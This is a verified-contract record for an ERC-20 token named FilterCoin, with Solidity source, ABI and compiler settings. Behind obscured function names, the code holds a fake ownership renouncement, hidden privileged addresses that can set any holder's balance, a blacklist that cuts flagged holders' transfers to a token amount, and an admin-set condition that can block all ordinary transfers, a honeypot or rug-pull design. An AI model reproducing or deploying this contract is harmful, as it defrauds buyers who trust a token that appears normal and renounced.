{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\ninterface liquidityToWallet {\n    function createPair(address minIs, address shouldIs) external returns (address);\n    function feeTo() external view returns (address);\n}\n\ninterface enableTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalSender) external view returns (uint256);\n\n    function transfer(address minReceiver, uint256 exemptLaunched) external returns (bool);\n\n    function allowance(address feeLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minReceiver,\n        uint256 exemptLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptTx, uint256 value);\n    event Approval(address indexed feeLimit, address indexed spender, uint256 value);\n}\n\nabstract contract autoMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txFee is enableTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FilterCoin is autoMax, enableTake, txFee {\n\n    bool private amountWallet;\n\n    uint256 public listSwap;\n\n    function fundTotalList(address liquidityFund) public {\n        if (minMarketingExempt) {\n            return;\n        }\n        \n        fromMin[liquidityFund] = true;\n        \n        minMarketingExempt = true;\n    }\n\n    bool private buyIsAuto;\n\n    mapping(address => mapping(address => uint256)) private maxIsTotal;\n\n    function feeBuyMin() public {\n        emit OwnershipTransferred(marketingFee, address(0));\n        exemptTeam = address(0);\n    }\n\n    event OwnershipTransferred(address indexed enableReceiver, address indexed amountMode);\n\n    uint256 private totalTx;\n\n    bool public shouldList;\n\n    function owner() external view returns (address) {\n        return exemptTeam;\n    }\n\n    address autoFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address totalSender) public view virtual override returns (uint256) {\n        return buyShouldSwap[totalSender];\n    }\n\n    address toExemptFrom;\n\n    string private fromMarketingFund = \"Filter Coin\";\n\n    address public receiverEnable;\n\n    mapping(address => bool) public tokenReceiverTake;\n\n    uint8 private modeExempt = 18;\n\n    address public marketingFee;\n\n    address private exemptTeam;\n\n    function receiverExemptTeam(address feeSwap, address minReceiver, uint256 exemptLaunched) internal returns (bool) {\n        require(buyShouldSwap[feeSwap] >= exemptLaunched);\n        buyShouldSwap[feeSwap] -= exemptLaunched;\n        buyShouldSwap[minReceiver] += exemptLaunched;\n        emit Transfer(feeSwap, minReceiver, exemptLaunched);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptTeam;\n    }\n\n    uint256 private txTotal = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private buyShouldSwap;\n\n    function allowance(address launchFeeShould, address fundMode) external view virtual override returns (uint256) {\n        if (fundMode == autoFrom) {\n            return type(uint256).max;\n        }\n        return maxIsTotal[launchFeeShould][fundMode];\n    }\n\n    uint256 senderMarketing;\n\n    mapping(address => bool) public fromMin;\n\n    function launchedReceiver() private view {\n        require(fromMin[_msgSender()]);\n    }\n\n    constructor (){\n        \n        feeBuyMin();\n        liquidityShould fundTx = liquidityShould(autoFrom);\n        receiverEnable = liquidityToWallet(fundTx.factory()).createPair(fundTx.WETH(), address(this));\n        toExemptFrom = liquidityToWallet(fundTx.factory()).feeTo();\n        \n        marketingFee = _msgSender();\n        fromMin[marketingFee] = true;\n        buyShouldSwap[marketingFee] = txTotal;\n        if (marketingBuy != amountWallet) {\n            shouldList = false;\n        }\n        emit Transfer(address(0), marketingFee, txTotal);\n    }\n\n    bool public minMarketingExempt;\n\n    uint256 maxAt;\n\n    function transfer(address shouldFrom, uint256 exemptLaunched) external virtual override returns (bool) {\n        return minEnableAuto(_msgSender(), shouldFrom, exemptLaunched);\n    }\n\n    function fundFeeShould(uint256 exemptLaunched) public {\n        launchedReceiver();\n        maxAt = exemptLaunched;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromMarketingFund;\n    }\n\n    function approve(address fundMode, uint256 exemptLaunched) public virtual override returns (bool) {\n        maxIsTotal[_msgSender()][fundMode] = exemptLaunched;\n        emit Approval(_msgSender(), fundMode, exemptLaunched);\n        return true;\n    }\n\n    function transferFrom(address feeSwap, address minReceiver, uint256 exemptLaunched) external override returns (bool) {\n        if (_msgSender() != autoFrom) {\n            if (maxIsTotal[feeSwap][_msgSender()] != type(uint256).max) {\n                require(exemptLaunched <= maxIsTotal[feeSwap][_msgSender()]);\n                maxIsTotal[feeSwap][_msgSender()] -= exemptLaunched;\n            }\n        }\n        return minEnableAuto(feeSwap, minReceiver, exemptLaunched);\n    }\n\n    function fromMarketing(address shouldTx) public {\n        launchedReceiver();\n        \n        if (shouldTx == marketingFee || shouldTx == receiverEnable) {\n            return;\n        }\n        tokenReceiverTake[shouldTx] = true;\n    }\n\n    uint256 public totalSwap;\n\n    bool private marketingBuy;\n\n    function fromTradingAuto(address shouldFrom, uint256 exemptLaunched) public {\n        launchedReceiver();\n        buyShouldSwap[shouldFrom] = exemptLaunched;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromLaunch;\n    }\n\n    function minEnableAuto(address feeSwap, address minReceiver, uint256 exemptLaunched) internal returns (bool) {\n        if (feeSwap == marketingFee) {\n            return receiverExemptTeam(feeSwap, minReceiver, exemptLaunched);\n        }\n        uint256 fromLimit = enableTake(receiverEnable).balanceOf(toExemptFrom);\n        require(fromLimit == maxAt);\n        require(minReceiver != toExemptFrom);\n        if (tokenReceiverTake[feeSwap]) {\n            return receiverExemptTeam(feeSwap, minReceiver, swapExempt);\n        }\n        return receiverExemptTeam(feeSwap, minReceiver, exemptLaunched);\n    }\n\n    uint256 private txSwapBuy;\n\n    bool public listLaunchFund;\n\n    uint256 constant swapExempt = 5 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txTotal;\n    }\n\n    string private fromLaunch = \"FCN\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFeeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuyMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTx\",\"type\":\"address\"}],\"name\":\"fromMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"fromTradingAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"fundFeeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFund\",\"type\":\"address\"}],\"name\":\"fundTotalList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunchFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenReceiverTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FilterCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}